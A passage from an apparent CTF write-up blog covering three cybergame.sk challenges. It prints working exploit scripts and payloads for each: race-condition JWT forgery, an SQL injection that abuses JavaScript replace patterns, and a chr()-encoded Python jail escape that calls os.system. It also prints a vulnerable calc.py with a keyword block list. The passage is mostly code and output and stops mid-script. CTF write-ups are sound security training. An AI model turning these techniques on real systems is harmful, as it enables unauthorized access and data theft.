+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;password&#34;</span>: password,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;email&#34;</span>: email
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Start register request but don&#39;t wait for response</span>
+</span></span><span style=display:flex><span>    register_task <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>post(
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>BASE_URL<span style=color:#e6db74>}</span><span style=color:#e6db74>/api/register&#34;</span>,
+</span></span><span style=display:flex><span>        json<span style=color:#f92672>=</span>data,
+</span></span><span style=display:flex><span>        auth<span style=color:#f92672>=</span>AUTH
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Immediately start login request</span>
+</span></span><span style=display:flex><span>    login_data <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;username&#34;</span>: username,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;password&#34;</span>: password
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    login_task <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>post(
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>BASE_URL<span style=color:#e6db74>}</span><span style=color:#e6db74>/api/login&#34;</span>,
+</span></span><span style=display:flex><span>        json<span style=color:#f92672>=</span>login_data,
+</span></span><span style=display:flex><span>        auth<span style=color:#f92672>=</span>AUTH
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Wait for both requests to complete</span>
+</span></span><span style=display:flex><span>    register_response, login_response <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> asyncio<span style=color:#f92672>.</span>gather(register_task, login_task)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> login_response<span style=color:#f92672>.</span>status <span style=color:#f92672>==</span> <span style=color:#ae81ff>200</span>:
+</span></span><span style=display:flex><span>        token <span style=color:#f92672>=</span> login_response<span style=color:#f92672>.</span>cookies<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;token&#34;</span>)<span style=color:#f92672>.</span>value
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#39;token:&#39;</span>, token)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> token
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Login failed: </span><span style=color:#e6db74>{</span><span style=color:#66d9ef>await</span> login_response<span style=color:#f92672>.</span>text()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>create_malicious_token</span>(valid_token):
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Split the valid token</span>
+</span></span><span style=display:flex><span>    parts <span style=color:#f92672>=</span> valid_token<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;.&#34;</span>)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Create malicious payload</span>
+</span></span><span style=display:flex><span>    malicious_payload <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;id&#34;</span>: <span style=color:#e6db74>&#34;any_id&#34;</span>,  <span style=color:#75715e># This doesn&#39;t matter as we&#39;re bypassing verification</span>
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;username&#34;</span>: <span style=color:#e6db74>&#34;any_username&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;is_d4rk_pr1nc3ss&#34;</span>: <span style=color:#66d9ef>True</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Encode malicious payload</span>
+</span></span><span style=display:flex><span>    malicious_payload_b64 <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64encode(
+</span></span><span style=display:flex><span>        json<span style=color:#f92672>.</span>dumps(malicious_payload)<span style=color:#f92672>.</span>encode()
+</span></span><span style=display:flex><span>    )<span style=color:#f92672>.</span>decode()
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Create malicious token</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Format: header.malicious_payload.original_payload.signature</span>
+</span></span><span style=display:flex><span>    malicious_token <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>parts[<span style=color:#ae81ff>0</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>{</span>malicious_payload_b64<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>{</span>parts[<span style=color:#ae81ff>1</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>{</span>parts[<span style=color:#ae81ff>2</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> malicious_token
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_secret_note</span>(session, token):
+</span></span><span style=display:flex><span>    response <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> session<span style=color:#f92672>.</span>get(
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>BASE_URL<span style=color:#e6db74>}</span><span style=color:#e6db74>/api/secret-note&#34;</span>,
+</span></span><span style=display:flex><span>        cookies<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;token&#34;</span>: token},
+</span></span><span style=display:flex><span>        auth<span style=color:#f92672>=</span>AUTH
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> response<span style=color:#f92672>.</span>status <span style=color:#f92672>==</span> <span style=color:#ae81ff>200</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>await</span> response<span style=color:#f92672>.</span>text()
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Failed to get secret note: </span><span style=color:#e6db74>{</span><span style=color:#66d9ef>await</span> response<span style=color:#f92672>.</span>text()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>async</span> <span style=color:#66d9ef>with</span> aiohttp<span style=color:#f92672>.</span>ClientSession(trust_env<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>) <span style=color:#66d9ef>as</span> session:
+</span></span><span style=display:flex><span>        <span style=color:#75715e># Try multiple times to catch the race condition</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>10</span>):
+</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#34;Attempting to register and login...&#34;</span>)
+</span></span><span style=display:flex><span>            
+</span></span><span style=display:flex><span>            <span style=color:#75715e># Try to register and login simultaneously</span>
+</span></span><span style=display:flex><span>            token <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> register_and_login(session)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> token:
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>continue</span>
+</span></span><span style=display:flex><span>            
+</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#34;Got valid token! Creating malicious token...&#34;</span>)
+</span></span><span style=display:flex><span>            
+</span></span><span style=display:flex><span>            <span style=color:#75715e># Create malicious token</span>
+</span></span><span style=display:flex><span>            malicious_token <span style=color:#f92672>=</span> create_malicious_token(token)
+</span></span><span style=display:flex><span>            
+</span></span><span style=display:flex><span>            <span style=color:#75715e># Try to get secret note</span>
+</span></span><span style=display:flex><span>            secret <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> get_secret_note(session, malicious_token)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> secret:
+</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Success! Secret note: </span><span style=color:#e6db74>{</span>secret<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Malicious token: </span><span style=color:#e6db74>{</span>malicious_token<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>            
+</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#34;Failed to get secret note, trying again...&#34;</span>)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>await</span> asyncio<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>0.1</span>)  <span style=color:#75715e># Small delay between attempts</span>
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Failed to exploit after multiple attempts&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    asyncio<span style=color:#f92672>.</span>run(main()) 
+</span></span></code></pre></div><p>Results:</p><pre tabindex=0><code>python3 exploit.py
+Attempting to register and login...
+token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjhlNTc3MGMwLTIxM2MtNDI2NC1iMDc2LTlmYWNkMmY2MzBlYyIsInVzZXJuYW1lIjoiaGFja2VyX2MxMjkxODgxLTQzZDgtNGFmOC1hNDNjLTQ2MmJhZmRjNzA0ZiJ9.%2BrrHJQUzZABEwFs6E2h9p%2FkwZ%2F4yEmIqMGtWA%2BiH%2FgE%3D
+Got valid token! Creating malicious token...
+Success! Secret note: They fear the night, yet they do not understand its power. The fools bask in the daylight, blind to what lurks beyond the stars. But I see. I remember. And soon, they will too. The throne was never meant for the sun alone. The time will come. I must be patient. SK-CERT{1_w1ll_rul3_th3_n1ght_4nd_th3_d4y}
+</code></pre><h2 id=final-curse>Final Curse</h2><p><img src="https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup6/images/final%20escape.png?raw=true" alt=jaille></p><p><em>Solution</em></p><p>This appears to be an SQL injection; well, I guess more of a JavaScript injection—the following payload does the magic:</p><pre tabindex=0><code>$`\tOR\tTRUE\tUNION\t$`
+</code></pre><p>It is because <code>\t</code> is not filtered and is a valid token separator in PostgreSQL. But the main part if breaking of the single quotes.</p><p>In JavaScript&rsquo;s <code>String.prototype.replace(searchValue, replaceValue)</code>, the <code>replaceValue</code> isn’t just verbatim text - any <code>$&lt;something></code> sequences inside it are special &ldquo;replacement‑pattern&rdquo; tokens. The ones that matter here are:</p><ul><li><code>$`</code>  (dollar + backtick): the portion of the original string before the matched substring</li><li><code>$&</code> (dollar + ampersand): the matched substring itself</li><li><code>$'</code> (dollar + single‑quote): the portion after the match</li></ul><p>Injecting that results in this query:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>FROM</span> notes
+</span></span><span style=display:flex><span><span style=color:#66d9ef>WHERE</span> user_id <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;SELECT * FROM notes WHERE user_id = &#39;</span>
+</span></span><span style=display:flex><span>   <span style=color:#66d9ef>OR</span> <span style=color:#66d9ef>TRUE</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>UNION</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>FROM</span> notes
+</span></span><span style=display:flex><span><span style=color:#66d9ef>WHERE</span> user_id <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
+</span></span></code></pre></div><p>Use <code>exploit_sqli.py</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> base64
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> json
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Server URL</span>
+</span></span><span style=display:flex><span>BASE_URL <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://exp.cybergame.sk:7000/secretbackend&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Basic auth credentials</span>
+</span></span><span style=display:flex><span>AUTH <span style=color:#f92672>=</span> (<span style=color:#e6db74>&#34;pr1ncess&#34;</span>, <span style=color:#e6db74>&#34;SK-CERT</span><span style=color:#e6db74>{0ff_by_4_s1ngle_sl4sh_f836a8b1}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># SQL injection payload</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;$`</span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>OR</span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>TRUE</span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>UNION</span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>$`&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Create malicious token</span>
+</span></span><span style=display:flex><span>malicious_payload <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;id&#34;</span>: payload,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;username&#34;</span>: <span style=color:#e6db74>&#34;any_username&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;is_d4rk_pr1nc3ss&#34;</span>: <span style=color:#66d9ef>True</span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Encode malicious payload</span>
+</span></span><span style=display:flex><span>malicious_payload_b64 <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64encode(
+</span></span><span style=display:flex><span>    json<span style=color:#f92672>.</span>dumps(malicious_payload)<span style=color:#f92672>.</span>encode()
+</span></span><span style=display:flex><span>)<span style=color:#f92672>.</span>decode()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Create malicious token</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Format: header.malicious_payload.original_payload.signature</span>
+</span></span><span style=display:flex><span>malicious_token <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.</span><span style=color:#e6db74>{</span>malicious_payload_b64<span style=color:#e6db74>}</span><span style=color:#e6db74>.eyJpZCI6Ijk3ZmM2NTAzLTZiNTEtNGMwNC1iN2FkLWIyODg0ODU2NTg1MiIsInVzZXJuYW1lIjoiaGFja2VyXzU0YWQzNDM3LWE3NDQtNDNiZC04ODk3LTRjNzAzNjE5NDE0MCJ9.sjx1E1dYfc51yeAWZRZpedQKHHnUHow6W%2B9Z6pnY9Uc=&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Make the request</span>
+</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>BASE_URL<span style=color:#e6db74>}</span><span style=color:#e6db74>/api/notes&#34;</span>,
+</span></span><span style=display:flex><span>    auth<span style=color:#f92672>=</span>AUTH,
+</span></span><span style=display:flex><span>    cookies<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;token&#34;</span>: malicious_token}
+</span></span><span style=display:flex><span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Print the response</span>
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Status code: </span><span style=color:#e6db74>{</span>response<span style=color:#f92672>.</span>status_code<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Response: </span><span style=color:#e6db74>{</span>response<span style=color:#f92672>.</span>text<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>) 
+</span></span></code></pre></div><p>and get a bunch of mess, somewhere in there is a flag:</p><pre tabindex=0><code>SK-CERT{j4v4scr1p7_1s_full_of_curs3d_(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(![]+[])[+[]]+(![]+[])[+[]]}
+</code></pre><h3 id=jaile---calculator><strong>JAILE - Calculator</strong></h3><p><img src="https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup6/images/jaille%20calculator.png?raw=true" alt=calc></p><p>calc.py</p><p><strong>solution</strong></p><p>The challenge involved analyzing an exposed Python calculator program (<code>calc.py</code>) running as a service on <code>exp.cybergame.sk:7002</code>. The goal was to find a vulnerability and exploit it to retrieve a flag.</p><h2 id=steps-taken>Steps Taken</h2><ol><li><strong>Code Analysis:</strong> Reviewed <code>calc.py</code> to understand its functionality and identify the <code>exec()</code> vulnerability and filtering mechanism.</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>    import socket
+</span></span><span style=display:flex><span>import os
+</span></span><span style=display:flex><span>import pty
+</span></span><span style=display:flex><span>import sys
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>def handle_client<span style=color:#f92672>(</span>conn<span style=color:#f92672>)</span>:
+</span></span><span style=display:flex><span>    s_fd <span style=color:#f92672>=</span> conn.fileno<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span>    os.dup2<span style=color:#f92672>(</span>s_fd, 0<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>    os.dup2<span style=color:#f92672>(</span>s_fd, 1<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>    os.dup2<span style=color:#f92672>(</span>s_fd, 2<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> b<span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> True:
+</span></span><span style=display:flex><span>        chunk <span style=color:#f92672>=</span> conn.recv<span style=color:#f92672>(</span>4096<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> not chunk:
+</span></span><span style=display:flex><span>            break
+</span></span><span style=display:flex><span>        data <span style=color:#f92672>+=</span> chunk
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> b<span style=color:#e6db74>&#39;\n&#39;</span> in data:
+</span></span><span style=display:flex><span>            break
+</span></span><span style=display:flex><span>    text <span style=color:#f92672>=</span> data.decode<span style=color:#f92672>()</span>.strip<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> keyword in <span style=color:#f92672>[</span><span style=color:#e6db74>&#39;eval&#39;</span>, <span style=color:#e6db74>&#39;exec&#39;</span>, <span style=color:#e6db74>&#39;import&#39;</span>, <span style=color:#e6db74>&#39;open&#39;</span>, <span style=color:#e6db74>&#39;os&#39;</span>, <span style=color:#e6db74>&#39;read&#39;</span>, <span style=color:#e6db74>&#39;system&#39;</span>, <span style=color:#e6db74>&#39;write&#39;</span><span style=color:#f92672>]</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> keyword in text.lower<span style=color:#f92672>()</span>:
+</span></span><span style=display:flex><span>            conn.sendall<span style=color:#f92672>(</span>b<span style=color:#e6db74>&#34;Not allowed, killing\n&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Check for forbidden characters.</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> character in <span style=color:#f92672>[</span><span style=color:#e6db74>&#39;\&#39;&#39;, &#39;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#39;]:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        if character in text.lower():
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            conn.sendall(b&#34;Not allowed, killing\n&#34;)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            return
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    try:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        exec(&#39;</span>print<span style=color:#f92672>(</span><span style=color:#e6db74>&#39; + text + &#39;</span><span style=color:#f92672>)</span><span style=color:#e6db74>&#39;)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    except Exception as e:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        conn.sendall((&#34;Error: &#34; + str(e) + &#34;\n&#34;).encode())
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>def main():
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    host = &#39;</span>0.0.0.0<span style=color:#e6db74>&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    port = 1337
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        s.bind((host, port))
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        s.listen(1)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        print(f&#34;Listening on {host}:{port}&#34;)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        conn, addr = s.accept()  # Handle one connection.
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        with conn:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            print(f&#34;Connection from {addr}&#34;)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            handle_client(conn)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    sys.exit(0)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>if __name__ == &#34;__main__&#34;:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    main()
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    ```
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>2.  **Exploit Development:** Created a Python script (`exploit.py`) to:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    *   Connect to the remote service (`exp.cybergame.sk:7002`).
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    *   Define a function `build_payload(command)` that takes a shell command string and constructs the bypass payload using `chr()` encoding.
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    *   Send the generated payload to the service.
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    *   Receive and print the response.
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    `exploit.py`
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>```bash
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    #!/usr/bin/env python3
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>import socket
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>import sys
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>HOST = &#34;exp.cybergame.sk&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>PORT = 7002
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>def build_payload(command):
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;Builds the payload using chr() to bypass filters.&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    import_key = &#34;+&#34;.join([f&#34;chr({ord(c)})&#34; for c in &#34;__import__&#34;])
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    os_module = &#34;+&#34;.join([f&#34;chr({ord(c)})&#34; for c in &#34;os&#34;])
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    system_func = &#34;+&#34;.join([f&#34;chr({ord(c)})&#34; for c in &#34;system&#34;])
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    cmd_str = &#34;+&#34;.join([f&#34;chr({ord(c)})&#34; for c in command])
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    payload = f&#34;getattr(__builtins__.__dict__[{import_key}]({os_module}), {system_func})({cmd_str})&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    return payload
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>def main():
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    command = &#34;cat flag.txt&#34; # Changed command to cat the flag file
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    payload = build_payload(command)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    try:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            s.settimeout(10)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            print(f&#34;[*] Connecting to {HOST}:{PORT}&#34;)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            s.connect((HOST, PORT))
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            print(&#34;[*] Connected.&#34;)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            print(&#34;[*] Sending payload...&#34;)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            s.sendall(payload.encode() + b&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            print(&#34;[*] Payload sent.&#34;)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            print(&#34;[*] Receiving response...&#34;)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            response = b&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            try:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>                while True:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    chunk = s.recv(4096)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    if not chunk:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>                        break
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    response += chunk
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            except socket.timeout:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>                print(&#34;[*] Socket timeout reached.&#34;)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            except Exception as e:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>                print(f&#34;[-] Error while receiving: {e}&#34;)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            print(&#34;[*] Response received:&#34;)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            # Decode and print the relevant part of the response
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            decoded_response = response.decode(errors=&#39;</span>ignore<span style=color:#e6db74>&#39;)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            print(decoded_response)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            # Extract the flag (assuming it&#39;</span>s the first line before the <span style=color:#66d9ef>return</span> code<span style=color:#f92672>)</span>
